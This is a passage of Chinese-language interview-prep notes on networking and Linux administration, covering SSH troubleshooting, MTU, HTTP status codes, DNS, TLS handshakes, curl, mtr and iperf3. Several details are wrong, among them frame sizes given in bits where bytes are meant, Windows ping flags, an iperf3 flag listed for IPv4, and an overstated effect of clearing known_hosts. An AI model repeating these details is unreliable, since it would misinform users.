denied (publickey)</strong> 的錯誤訊息<ul><li>原因一: 該私鑰沒有權限登入</li><li>原因二: 公鑰沒有正確被放入路徑或公鑰遺失</li><li>原因三: 本地 ssh 公鑰和私鑰未正確配對</li><li>在連接之前，ssh 會檢查我們的公鑰和私鑰是否正確配對</li></ul></li><li>預設路徑<ul><li><code>$ ssh-keygen</code></li><li>公鑰預設放在 <code>/home/username/.ssh/id_rsa.pub</code></li><li>私鑰預設放在 <code>/home/username/.ssh/id_rsa</code></li></ul></li><li>要如何將公鑰注入至Server路徑中? <ul><li><code>ssh-copy-id USER@HOST</code></li><li>預設就是放入 <strong>~&#x2F;.ssh&#x2F;authorized_keys</strong></li></ul></li></ul></li><li><strong>防火牆導致無法連線</strong><ul><li>檢查Policy</li></ul></li><li><strong>Host Key Check Fails</strong><br>  <img src="https://i.imgur.com/XSDQF9V.png"><br>  出現類似這種錯誤訊息<br>  每個Server都會有Fingerprint，不同server或server重新配置則fingerprint則不同<br>  當成功登入，則電腦會保存fingerprint來為下一次連接做比較，若fingerprint不匹配則會跳出這種警告<ul><li>如果確定有重新設定server則可以忽略這個警告</li><li>可以在 <strong>~&#x2F;.ssh&#x2F;known_hosts</strong> 刪除entry，或清空文件，這將會關閉所有密鑰檢查</li></ul></li><li><strong>Your SSH Key File Mode Issues</strong><ul><li>作為保護 SSH Key檔案的權限應該要是0600(Owner R+W)或0400(Owner R)<br>  <img src="https://i.imgur.com/F9O86LG.png"></li></ul></li></ul></li><li>SSH中要如何啟用無密碼認證?<ul><li>至<code>/etc/ssh/sshd_config</code> 中修改設定  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PasswordAuthentication no</span><br><span class="line">PubkeyAuthentication yes</span><br></pre></td></tr></table></figure></li></ul></li><li>講解一下Ping跟Tracert指令是怎麼運作的?<br>  <img src="https://i.imgur.com/Kog8FV8.png"><ul><li>Ping: 向特定目標發送ICMP Echo Request以確認對目的端的通訊狀態<ul><li>可以根據ping返回的TTL值來判斷對方所使用的操作系統及數據包經過路由器數量</li></ul></li><li>Tracert: 善用回應逾時的錯誤以查詢到目的地的路徑</li></ul></li><li><a href="https://www.361way.com/linux-mtu-jumbo-frames/4055.html">Linux底下要怎麼修改MTU值?</a></li><li>甚麼是Jumbo Frame?<ul><li>為比標準Ethernet Frame還大的Frame，比1518&#x2F;1522 bit大的frame</li><li>只能在full-duplex的乙太網路中運行</li><li>標準Ethernet IP訊息大小是: 1500Bit，若包含Ethernet Header以及FCS(6+6+2+4)是1518bit</li><li>Jumbo frame指的是兩層封裝三層IP Message的值大於9000bit的Message</li><li>若使用一般1500Bit的frame，frame越小，傳輸封包量越大，計算量越多，則:<ul><li>增加Host的計算量，消耗CPU資源</li><li>影響網路傳輸速度</li><li>所以加大frame可以降低CPU計算量並加快傳輸速度</li></ul></li></ul></li><li>如何修改frame大小(如何創造Jumbo Frame?)<ul><li>修改MTU(Maximum Transmission Unit)值 </li><li><ol><li><code>ifconfig $&#123;Interface&#125; mtu $&#123;SIZE&#125; up</code></li></ol></li><li>ex. <code>ifconfig eth1 mtu 9000 up</code></li><li>但這樣重啟需要重新設定</li><li><ol start="2"><li>修改config檔案</li></ol></li><li>Ubuntu&#x2F;Debian底下是在 &#x2F;etc&#x2F;network&#x2F;interfaces底下</li><li>新增 <code>mtu 9000</code></li><li>重啟服務 <code>/etc/init.d/network-manager restart</code></li><li><strong>經過交換網路設定時，僅修改Host端的MTU值不太行，還續鑰檢查網路設備有無啟用jumbo frames功能</strong></li></ul></li><li>測試MTU<ul><li><code>ping -l 9000 -f &lt;domain&gt;</code></li><li>-f 參數告訴作業系統不能私自更改封包大小</li></ul></li><li>講解一下Email的通訊原理<ul><li>當輸入Email時，”@”後面即為Domain Name<blockquote><p><a href="http://linux.vbird.org/linux_server/0380mail.php#whatmail_dns">http://linux.vbird.org/linux_server/0380mail.php#whatmail_dns</a><br><a href="https://weils.net/blog/2017/04/19/how-email-works-dkim-all-in-one/">https://weils.net/blog/2017/04/19/how-email-works-dkim-all-in-one/</a><br><a href="https://docs.digitalocean.com/support/how-to-troubleshoot-ssh-connectivity-issues/">https://docs.digitalocean.com/support/how-to-troubleshoot-ssh-connectivity-issues/</a><br><a href="https://www.linux.com/topic/networking/4-reasons-why-ssh-connection-fails/">https://www.linux.com/topic/networking/4-reasons-why-ssh-connection-fails/</a><br><a href="https://help.skysilk.com/support/solutions/articles/9000150151-how-to-troubleshoot-ssh-connection-issues-using-vnc-console">https://help.skysilk.com/support/solutions/articles/9000150151-how-to-troubleshoot-ssh-connection-issues-using-vnc-console</a></p></blockquote></li></ul></li><li>DNS設定失敗會怎麼解決?<blockquote><p><a href="https://www.digitalocean.com/community/tutorial_series/an-introduction-to-managing-dns">https://www.digitalocean.com/community/tutorial_series/an-introduction-to-managing-dns</a> </p></blockquote></li><li>可以講解一下HTTP協定運作原理嗎?<br>  <img src="https://i.imgur.com/kwU3Ay7.png"><ul><li>通常由使用者透過瀏覽器或爬蟲來對Server端發出請求</li><li>那其中我們會稱這個client為User Agent，一個代理程式</li><li>而請求的Server上可能也會有一些像是HTML檔案或圖像之類的資源</li><li>當HTTP Client發出請求，建立一個到Server端指定port(預設是80)的TCP連線</li><li>則HTTP Server則會在那個port監聽client的請求</li><li>一旦收到請求，Server會向Client返回一個狀態 ex. “HTTP&#x2F;1.1 200 OK”，以及返回內容或錯誤訊息等等資訊</li><li>HTTP在1.1中加入了保持連線的機制，一個連接可以重複在多個請求&#x2F;回應使用</li><li>可以減少等待時間</li></ul></li><li>那HTTPS呢?<ul><li>就是在進行HTTP連線之前會先進行TLS&#x2F;SSL Handshake</li></ul></li><li>你知道的HTTP狀態碼有哪些?<ul><li>2xx<br>  <img src="https://i.imgur.com/KWTpmAh.png"></li><li>3xx<br>  <img src="https://i.imgur.com/zShTVKk.png"></li><li>400 - Bad Request : 代表送到Server的HTTP Request語法有誤或無效<ul><li>檢查: </li><li><ol><li>URL中的錯誤</li></ol></li><li><ol start="2"><li>與該網站的cookie可能毀損，清除瀏覽器的cookie以及cache</li></ol></li><li><ol start="3"><li>嘗試在不同的web瀏覽器上打開相同的網頁</li></ol></li></ul></li><li>401 - Unauthorized: 代表使用者在未經身分認證的情況下嘗試存取資源，而用戶必須提供credential才可以查看受保護的資源<ul><li>檢查:</li><li><ol><li>檢查URL錯誤，若URL有效，則存取主頁並登入，輸入資訊，然後重試</li></ol></li><li><ol start="2"><li>瀏覽器也可能快取到無效資訊，因此可以清除快取</li></ol></li></ul></li><li>403 - Forbidden: 發生在用戶發出有效請求但Server由於缺乏存取資源的權限而拒絕服務時<ul><li>檢查: </li><li><ol><li>確保Server中 &#x2F;www 資料的存取權限是正確的</li></ol></li><li><ol start="2"><li>檢查 .htaccess 設定(.htaccess 文件控制對資源的存取)</li></ol></li><li><ol start="3"><li>若網站沒有index文件，也有可能發生這種情況，這樣須將主頁重新命名為index.html&#x2F;index.php</li></ol></li><li><ol start="3"><li>與網站管理員聯繫已取得存取權限 (應將權限設為讀取)</li></ol></li><li><ol start="4"><li>若其他用戶可以存取，則需要聯絡ISP來解決這個問題</li></ol></li></ul></li><li>404 - Not Found: 代表用戶可與Server通訊，但無法定位所請求的資源<ul><li>檢查:</li><li><ol><li>一樣URL有沒有錯</li></ol></li><li><ol start="2"><li>F5更新網頁</li></ol></li><li><ol start="3"><li>清除瀏覽器快取</li></ol></li><li><ol start="4"><li>修改DNS Server設定</li></ol></li></ul></li><li>500 - Internal Server Error: 這代表網站Server出現問題，Server無法偵測確切問題，但client端還是能夠嘗試以下步驟<ul><li>檢查:</li><li><ol><li>網路流量高，按下F5，重新載入網頁</li></ol></li><li><ol start="2"><li>清除網路瀏覽器快取和cookie</li></ol></li><li><ol start="3"><li>檢查網站的 .htaccess文件被正確建立</li></ol></li><li><ol start="4"><li>檢查文件和資料夾是否有任何不正確的權限</li></ol></li></ul></li><li>502 - Bad Gateway: 代表Server充當gateway或proxy，無法從上游Server獲得有效的Response，這也有可能是由於DNS問題所造成的<ul><li>檢查:</li><li><ol><li>F5鍵，重新載入網頁</li></ol></li><li><ol start="2"><li>關閉所有打開的瀏覽器並啟動新的瀏覽器Session</li></ol></li><li><ol start="3"><li>清空瀏覽器快取</li></ol></li><li><ol start="4"><li>暫時禁用CDN(Content Delivery Network)</li></ol></li><li><ol start="5"><li>重啟網路設備(modem, router etc.)</li></ol></li></ul></li><li>503 - Service Unavailable: 這代表server負載過大，或正在維護中<ul><li>檢查:</li><li><ol><li>F5鍵，重新載入網頁</li></ol></li><li><ol start="2"><li>重啟網路設備(modem, router etc.)</li></ol></li></ul></li><li>504 - Gateway Timeout: 代表Server是Gateway或proxy，在允許的時間內無法從後端server獲得response<ul><li>檢查:</li><li><ol><li>F5鍵，重新載入網頁</li></ol></li><li><ol start="2"><li>重啟網路設備(modem, router etc.)</li></ol></li><li><ol start="3"><li>變更DNS Server(若你網路中的所有設備都收到相同錯誤)</li></ol></li><li><ol start="4"><li>仍然有錯誤可能要聯絡網管或ISP</li></ol></li></ul></li></ul></li><li>可以講解一下SMTP運作原理嗎?</li><li>可以講解一下DNS的運作原理?<ul><li>有分成兩種，一種是授權型DNS另一種是遞迴型server</li><li>授權型會接收並回應DNS查詢服務，一層一層找到root DNS Server</li><li>遞迴型則本身沒有DNS Record，但它會將請求傳遞給授權DNS Server去取得IP位址</li><li>運作流程:<ul><li>當輸入<a href="http://www.ntust,edu.tw/">www.ntust,edu.tw</a> 時，DNS Server會接收到查詢IP位址的請求</li><li>DNS Server會開始查詢<a href="http://www.example.com/">www.example.com</a> 的IP位址</li><li>並檢查local DNS Server的Cache中有沒有dns record<ul><li>會去 <code>/etc/resolv.conf</code> 查找，將網域變更為FQDN</li></ul></li><li>若沒有則會去root DNS Server去查找</li><li>root DNS Server會去告知DNS Server 「管理tw的DNS Server」的IP地址</li><li>而local DNS Server取得該IP後就會去發出DNS請求<ul><li><code>dig tw ns +short</code></li></ul></li><li>而管理tw的DNS Server會去告訴local DNS Server 「管理 edu.tw的DNS Server」的IP位址<ul><li><code>dig @nameserver edu.tw ns</code></li><li><code>dig @a.dns.tw edu.tw ns +short</code></li></ul></li><li>而local DNS Server取得該IP後就會去發出DNS請求</li><li>管理edu.tw的DNS Server會去告訴local DNS Server 「管理ntust.edu.tw的DNS Server」的IP位址<ul><li><code>dig @nameserver ntust.edu.tw ns +short</code></li></ul></li><li>接著local DNS Server就會去對該IP位址發出請求<ul><li><code>dig @RealAuthorieServer ntust.edu.tw a +short</code></li></ul></li><li>則管理ntust.edu.tw的DNS Server會返回<a href="http://www.ntust.edu.tw的ip位址/">www.ntust.edu.tw的IP位址</a></li></ul></li></ul></li><li>可以講解一下TLS&#x2F;SSL Handeshake的過程嗎?<br>  <a href="https://www.cloudflare.com/zh-tw/learning/ssl/what-happens-in-a-tls-handshake/">https://www.cloudflare.com/zh-tw/learning/ssl/what-happens-in-a-tls-handshake/</a><br>  <img src="https://i.imgur.com/4EOqjes.png"><br>  運作在Session Layer，主要會在通訊雙方交換資訊並互相驗證，並透過他們所使用的通訊加密演算法並產生一致的工作金鑰<ul><li>TLS 握手什麼時候發生？<ul><li>用戶導航到一個使用 HTTPS 的網站，瀏覽器首先開始查詢網站的原始伺服器，這時就會發生 TLS 握手。</li><li>在任何其他通信使用HTTPS時（包括 API 調用和 DNS over HTTPS 查詢），也會發生 TLS 握手。</li><li>通過 TCP Handshake 打開 TCP 連接後，將發生 TLS Handshake</li></ul></li><li>TLS Handshake過程中發生啥事?<ul><li>client與server之間會進行以下操作:<ul><li>指定TLS版本(TLS 1.0、1.2、1.3)</li><li>決定所使用的密碼學套件</li><li>透過Server的公開密鑰和SSL憑證頒發機構的電子簽章去驗證Server的身分</li><li>生成工作階段金鑰，以便在握手完成後使用對稱加密</li></ul></li></ul></li><li>TLS Handshake的步驟是甚麼?<ul><li>具體步驟會隨著使用的金鑰交換演算法的不同而不同</li><li>最常用的是<strong>RSA</strong>金鑰交換演算法<ul><li><strong>Client Hello:</strong><ul><li>client對server發出hello消息來進行Handshake，其中包含了用戶端支援的TLS版本，支援的密碼套件、以及一個client隨機亂數</li></ul></li><li><strong>Server Hello:</strong><ul><li>回覆client hello，server回傳訊息中包含:</li><li>SSL憑證 <code>這是哪來的?怎麼產生的?</code></li><li>伺服器選擇的密碼套件</li><li>server隨機亂數</li></ul></li><li><strong>身分認證</strong><ul><li>client端使用頒發該憑證的憑證授權驗證伺服器的 SSL 憑證</li><li>此舉確認Server是其聲稱的身份，且client正在與該domain的實際所有者進行互動</li></ul></li><li><strong>premaster secret</strong><ul><li>client端再發送一串隨機位元組，即premaster secret</li><li>premaster secret使用公開金鑰加密(是client從SSL憑證中取得公鑰，來進行加密的)</li><li>只能使用server的secret key進行解密</li></ul></li><li><strong>secret key被使用</strong><ul><li>server透過私鑰對premaster secret進行解密</li></ul></li><li><strong>生成工作階段金鑰</strong><ul><li>client 與 server端均使用client亂數、server亂數和premaster secret去生成工作階段金鑰</li></ul></li><li><strong>client就緒</strong><ul><li>client會發送一條<strong>已完成</strong>的消息</li></ul></li><li><strong>server就緒</strong> <ul><li>server會發送一條<strong>已完成</strong>的消息</li></ul></li></ul></li><li>所有 TLS 握手都使用非對稱加密（公開金鑰和私密金鑰），但並不是所有的 TLS 握手都會在生成工作階段密鑰的過程中使用私密金鑰。例如，臨時 <strong>Diffie-Hellman</strong> 握手的步驟如下：<ul><li><strong>Client Hello</strong><ul><li>包含協定版本、client亂數、密碼學套件清單</li></ul></li><li><strong>Server Hello</strong><ul><li>包含SSL憑證、選定的密碼套件、Server亂數</li></ul></li><li><strong>server的數位簽章</strong><ul><li>server使用其私鑰對client亂數、server亂數以及DH參數進行加密</li><li>加密後的資料用作伺服器的數位簽章</li><li>已確定Server中具有與SSL憑證中的公鑰匹配的私鑰</li></ul></li><li><strong>Server與Client計算premaster secret</strong><ul><li>client與server使用交換的DH參數分別計算匹配的premaster secret</li><li>而不像RSA Handshake那樣由用戶端生成premaster secret並將其發送到server</li></ul></li><li><strong>建立工作階段金鑰</strong><ul><li>client與server從premaster secret、client亂數、server亂數中計算工作階段金鑰</li></ul></li><li><strong>client就緒</strong><ul><li>client會發送一條<strong>已完成</strong>的消息</li></ul></li><li><strong>server就緒</strong> <ul><li>server會發送一條<strong>已完成</strong>的消息</li></ul></li></ul></li></ul></li></ul></li><li><a href="https://segmentfault.com/a/1190000021778053">TLS Handshake失敗可能原因會是甚麼?</a><ul><li>常見錯誤訊息:<code>SSL Handshake Failed error</code></li><li>常見錯誤原因:<ul><li>協定不匹配  <code>server端出錯</code></li><li>加密套件不匹配 <code>server端出錯</code> → Server端不支援client請求使用的加密套件</li><li>系統時間不準確 (可是剛剛過程沒用到時間資訊阿:|)</li><li>瀏覽器設定錯誤</li><li>憑證錯誤 <code>server端出錯</code><ul><li>憑證中的domain name與URL中的domain name不符</li><li>憑證過期</li><li>或憑證鏈出錯</li><li>使用自簽名的憑證</li></ul></li><li>Server啟用了SNI-Enabled <code>server端出錯</code></li></ul></li><li><strong>協定不匹配</strong><ul><li>透過 <code>tcpdump -i any -s 0 host IP address -w File name</code> 在client或server上蒐集資訊</li><li>透過wireshark去分析蒐集的packet</li><li>去找<strong>client hello</strong>所使用的TLS版本</li><li>去看Sever端之後後續處理的錯誤資訊</li><li><a href="https://docs.apigee.com/api-platform/troubleshoot/runtime/ssl-handshake-failures">https://docs.apigee.com/api-platform/troubleshoot/runtime/ssl-handshake-failures</a></li></ul></li></ul></li><li>網站憑證過期該怎麼辦?<ul><li>去更新憑證</li></ul></li><li>可以講解一下甚麼是SSL嗎?<ul><li>全名是Secure Soekcts Layers，用來確保兩個系統之間所傳遞的敏感資料被竄改或讀取</li><li>TLS就是更安全的SSL版本</li></ul></li></ul><h2 id="Linux-Admin"><a href="#Linux-Admin" class="headerlink" title="Linux Admin"></a>Linux Admin</h2><blockquote><p>感覺偏向指令使用或config如何設定</p></blockquote><ul><li>在Linux中你會怎麼管理User跟Group?那在Windows中你又會怎麼做管理?<ul><li>看user<code>cat /etc/passwd</code></li><li>新增user <code>useradd</code></li><li>新增group <code>groupadd</code></li><li>再透過 <code>gpasswd</code> 將使用者加入或移除 root (sudo) 權限群組</li></ul></li><li>可以講解一下<code>curl</code> 指令的原理嗎?<ul><li>一個command line工具可以傳遞資料到server中</li></ul></li><li>你會怎麼使用 <code>curl</code> 這個指令來做Troubleshooting?<ul><li><code>$ curl protocol://IP/host:port</code></li><li>Troubleshooting Web Servers<ul><li><code>curl http://example.com -I</code> 透過-I參數來返回Header</li></ul></li><li>Troubleshooting SMTP Servers <ul><li><code>curl smtp://example.com</code> 預設使用 port 25 作為SMTP Port</li><li>但某些ISP會阻擋標準SMTP port來防止SPAM</li><li>亦可使用 2525 或 587 port</li></ul></li><li>Troubleshooting FTP<ul><li><code>curl ftp://example.com</code> 預設使用21 port</li></ul></li></ul></li><li>如何使用 <code>curl</code> 指令並透過proxy來連接?<ul><li><code>curl --proxy yourproxy:port https://yoururl.com</code></li></ul></li><li>如何透過 <code>curl</code> 略過檢查自簽SSL憑證的有效性?<ul><li><code>curl -k https://localhost/</code></li><li><code>curl --insecure https://localhost/</code></li></ul></li><li>curl 各種用法:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ curl [protocol://domain:port/]</span><br><span class="line">$ curl -o &lt;欲下載的檔名&gt; [protocol://domain:port/] 下載特定檔案</span><br><span class="line">$ curl -O [protocol://domain:port/file]  直接下載網址中的檔案</span><br><span class="line">$ curl -C - -O [protocol://domain:port/file] 從剛剛被中斷的地方繼續下載</span><br><span class="line">$ curl -L [protocol://domain:port/] 跟隨網址的301/302 redirect</span><br><span class="line">$ curl --trace-ascii debugdump.txt [protocol://domain:port/] 追蹤整個curl過程，並將結果存入debugdump.txt檔案</span><br></pre></td></tr></table></figure></li><li>curl 進行HTTP Request<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-X/--request [GET|POST|PUT|DELETE|PATCH]  使用指定的 http method 來發出 http request</span><br><span class="line">-H/--header                           設定 request 裡所攜帶的 header</span><br><span class="line">-i/--include                          在 output 顯示 response 的 header</span><br><span class="line">-d/--data                             攜帶 HTTP POST Data </span><br><span class="line">-v/--verbose                          輸出更多的訊息方便 debug</span><br><span class="line">-u/--user                             攜帶使用者帳號、密碼</span><br><span class="line">-b/--cookie                           攜帶 cookie（可以是參數或是檔案位置）</span><br></pre></td></tr></table></figure></li><li>透過 curl去POST資料到 HTML Form<ul><li>假設收到的Form表單的HTML長這樣  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method=&quot;POST&quot; action=&quot;form.php&quot;&gt;</span><br><span class="line">   &lt;input type=text name=&quot;email&quot;&gt;</span><br><span class="line">   &lt;input type=submit name=press value=&quot; OK &quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure></li><li><code>curl -X POST --data &quot;email=test@example.com&amp;press=%20OK%20&quot; http://www.example.com/form.php</code></li></ul></li><li>透過 curl去進行檔案上傳<ul><li>假設收到的Form表單的HTML是  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method=&quot;POST&quot; enctype=&#x27;multipart/form-data&#x27; action=&quot;upload.php&quot;&gt;</span><br><span class="line">&lt;input type=file name=upload&gt;</span><br><span class="line">&lt;input type=submit name=press value=&quot;OK&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure></li><li><code>curl -X POST -F &#39;file=@./upload.txt&#39; http://www.example.com/upload.php</code></li></ul></li><li>透過curl常見的RESTFul CRUD指令:<ul><li>GET單一或全部資源  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl -X GET &quot;http://www.example.com/api/resources&quot;</span><br><span class="line">$ curl -X GET &quot;http://www.example.com/api/resources/1&quot;</span><br></pre></td></tr></table></figure></li><li>POST JSON資料  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -X POST -H &quot;Content-Type: application/json&quot; -d &#x27;&#123;&quot;status&quot;:false,&quot;name&quot;:&quot;Jack&quot;&#125;&#x27; &quot;http://www.example.com/api/resources&quot;</span><br></pre></td></tr></table></figure></li><li>PUT JSON資料  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -X PUT -H &quot;Content-Type: application/json&quot; -d &#x27;&#123;&quot;status&quot;:false&#125;&#x27; &quot;http://www.example.com/api/resources&quot;</span><br></pre></td></tr></table></figure></li><li>DELETE 資源   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -X DELETE &quot;http://www.example.com/api/resources/1&quot;</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>透過curl攜帶cookie</strong><ul><li>在指令中輸入cookie  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl --cookie &quot;name=Jack&quot; http://www.example.com</span><br></pre></td></tr></table></figure></li><li>從檔案中讀取cookie  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl --cookie stored_cookies_file_path http://www.example.com</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>curl指定攜帶User Agent</strong>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl --user-agent &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64)&quot; http://www.example.com</span><br></pre></td></tr></table></figure><ul><li><strong>Basic Authentication:</strong> 若網頁有使用基本的Authentication則可攜帶<code>--user username:password</code> 來通過驗證  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -i --user secret:vary_secret http://www.example.com/api/resources</span><br></pre></td></tr></table></figure></li></ul></li><li>透過curl指令使用proxy做連接<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl --proxy yourproxy:port https://youurl.com</span><br></pre></td></tr></table></figure></li><li>curl限定下載速度<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl --limit-rate 2000B [URL]</span><br></pre></td></tr></table></figure></li><li><strong>在請求中注入特定Content-Type來處理特定問題</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl --header &#x27;Content-Type: application/json&#x27; http://yoururl.com</span><br></pre></td></tr></table></figure></li><li>僅在回應中呈現header<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl --head http://yoururl.com</span><br></pre></td></tr></table></figure></li><li><strong>連接 HTTPS&#x2F;SSL URL 並忽略任何 SSL 憑證錯誤</strong><ul><li>當試圖存取SSL&#x2F;TLS憑證的安全URL時候，若出現憑證錯誤或CN不匹配，則會出現以下錯誤<br>  <code>curl: (51) Unable to communicate securely with peer: requested domain name does not match the server&#39;s certificate.</code><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl --insecure https://yoururl.com</span><br></pre></td></tr></table></figure></li></ul></li><li>使用特定協定(SSL&#x2F;TLS)連線<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ curl --sslv3 https://yoururl.com</span><br><span class="line">$ curl --tlsv1 https://example.com</span><br><span class="line">$ curl --tlsv1.0 https://example.com</span><br><span class="line">$ curl --tlsv1.1 https://example.com</span><br><span class="line">$ curl --tlsv1.2 https://example.com</span><br><span class="line">$ curl --tlsv1.3 https://example.com</span><br></pre></td></tr></table></figure></li><li>從FTP Server中下載檔案<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -u user:password -O ftp://ftpurl/style.css</span><br></pre></td></tr></table></figure></li><li>可以講解一下MTR指令怎麼用嗎?<ul><li><a href="https://blog.gtwang.org/linux/mtr-linux-network-diagnostic-tool/"><strong>MTR</strong></a><ul><li>指令實作: MTR 在一開始會針對指定的主機，以 traceroute 找出中間的每一個網路節點（閘道器、路由器、橋接器等），然後使用 ping 去檢查每一個節點的網路連線狀況，即時更新在輸出的報表中，讓管理者一目了然。  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mtr www.google.com.tw   </span><br><span class="line">mtr -n www.google.com.tw //統一以ip位址來呈現</span><br><span class="line">mtr -b www.google.com.tw //同時呈現ip位址以及網域名稱</span><br><span class="line">mtr -c 5 www.google.com.tw // 指定ping 上限(ICMP ECHO 上限)</span><br><span class="line">mtr -c 5 -r www.google.com.tw &gt; output.txt //輸出報表</span><br><span class="line"></span><br></pre></td></tr></table></figure>  <img src="https://i.imgur.com/BSFP2pP.png"></li><li>L(Loss): 封包遺失率</li><li>S(Snt,Sent Packet): 封包發送數</li><li>Avg(Average RTT): </li><li>Best(Best RTT):</li><li>Worst(Worst RTT):</li></ul></li><li>所以從這個工具中可以發現甚麼?????</li></ul></li><li>可以講解一下 <code>iperf</code> 指令怎麼使用嗎?<ul><li>&#x3D; <code>iperf3</code>是一種網路頻寬測試工具，可以測試客戶端上傳資料速度</li><li>透過TCP來測量頻寬、確定鏈路品質跟延遲以及抖動和封包遺失</li><li>測時頻寬時，需要同時在server與client端都各執行一個iperf3程式，讓他們互相傳送資料進行測試  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># server端   </span><br><span class="line">iperf3 -s   //打開監聽socket 預設port為5201，開放Server Thread</span><br></pre></td></tr></table></figure>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># client端</span><br><span class="line">iperf3 -c SERVER_IP/HOSTNAME</span><br></pre></td></tr></table></figure></li><li>iperf3 也支援Android以及IOS的使用(有APP)</li><li>指定測試時間  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iperf3 -c SERVER_IP -t 20 -i 4 //測試20秒，每隔4秒輸出一次測試數據</span><br></pre></td></tr></table></figure></li><li>儲存測試結果  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iperf3 -c SERVER_IP --logfile output.txt</span><br></pre></td></tr></table></figure></li><li>指定port  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># Server端</span><br><span class="line">iperf3 -s -p 12345</span><br><span class="line"></span><br><span class="line"># client端</span><br><span class="line">iperf3 -c SERVER_IP -p 12345</span><br></pre></td></tr></table></figure></li><li>多條連線  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#同時使用兩條連線測試</span><br><span class="line">iperf3 -c SERVER_IP -P 2</span><br></pre></td></tr></table></figure></li><li>若要測試UDP傳輸協定效能，可以使用 <code>-u</code> 參數  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iperf3 -c SERVER_IP -u</span><br></pre></td></tr></table></figure></li><li>反向傳輸:測試下載速度(server傳送，cleint接收)<ul><li>預設資料流: client $\rightarrow$ Server  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iperf3 -c SERVER_IP -R</span><br></pre></td></tr></table></figure></li></ul></li><li>IPv4、IPv6  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iperf3 -c SERVER_IP -f</span><br><span class="line">iperf3 -c SERVER_IP -6</span><br></pre></td></tr></table></figure></li><li>自訂傳送檔案  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iperf3 -c SERVER_ip -F YOUR_FILE</span><br></pre></td></tr></table></figure></li></ul></li><li>可以講解一下 <code>tracert</code> 